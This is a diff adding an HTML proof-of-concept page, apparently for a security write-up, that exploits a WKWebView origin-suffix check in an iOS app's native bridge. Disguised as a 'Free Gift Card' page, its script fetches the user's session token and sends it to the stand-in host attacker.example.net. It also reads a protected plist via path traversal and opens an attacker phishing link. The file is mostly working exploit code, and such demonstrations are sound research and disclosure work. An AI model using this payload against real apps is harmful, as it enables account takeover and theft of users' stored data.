@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free Gift Card</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:24px;
+       background:#0b0b0f;color:#eee}
+  h1{font-size:22px}
+  pre{background:#15151c;padding:12px;border-radius:10px;overflow:auto;font-size:12px}
+  button{padding:12px 18px;font-size:16px;border:0;border-radius:10px;background:#4f8cff;color:#fff}
+</style>
+</head>
+<body>
+<h1>Your gift card is ready ( ͡° ͜ʖ ͡°)</h1>
+<p>Attacker-controlled page that the vulnerable WKWebView agreed to load because
+   <code>evilapp.example.com</code> has the suffix <code>app.example.com</code>.</p>
+<button id="go">Claim reward</button>
+<pre id="out">waiting for native bridge...</pre>
+
+<script>
+// ---------------------------------------------------------------------------
+// This script runs with the app's injected user script in scope, i.e. the
+// `window.NativeBridge` wrappers + the `native` message handler are available.
+// Nothing here should ever run on an attacker origin.
+// ---------------------------------------------------------------------------
+
+const out = document.getElementById('out');
+
+// Capture whatever native sends back through __nativeCallback.
+let pending = null;
+window.addEventListener('native:result', (e) => {
+  const v = e.detail;
+  out.textContent += '\n<- ' + (typeof v === 'string' ? v : JSON.stringify(v));
+  if (pending) { pending(v); pending = null; }
+});
+
+// Wrap a bridge call in a promise so we can await the token.
+function callNative(action, params = {}) {
+  return new Promise((resolve) => {
+    pending = resolve;
+    window.webkit.messageHandlers.native.postMessage({ action, ...params });
+    setTimeout(() => { if (pending === resolve) { pending = null; resolve(null); } }, 1500);
+  });
+}
+
+document.getElementById('go').addEventListener('click', async () => {
+  out.textContent = '[*] calling native bridge...';
+
+  // 1) Steal the session token (account takeover primitive).
+  const token = await callNative('getToken');
+  out.textContent += '\n[+] token = ' + token;
+
+  // 2) Exfiltrate it to the attacker server.
+  if (token) {
+    try {
+      await fetch('https://attacker.example.net/collect?t=' + encodeURIComponent(token),
+                  { mode: 'no-cors' });
+      out.textContent += '\n[+] token exfiltrated';
+    } catch (e) { out.textContent += '\n[!] exfil failed: ' + e; }
+  }
+
+  // 3) Arbitrary file read via the readFile handler (path traversal).
+  const secret = await callNative('readFile', { path: '../../../Library/Preferences/com.example.securevault.plist' });
+  out.textContent += '\n[+] readFile -> ' + secret;
+
+  // 4) Native action SSRF / scheme pivot.
+  callNative('openExternal', { url: 'https://attacker.example.net/phish' });
+});
+</script>
+</body>
+</html>
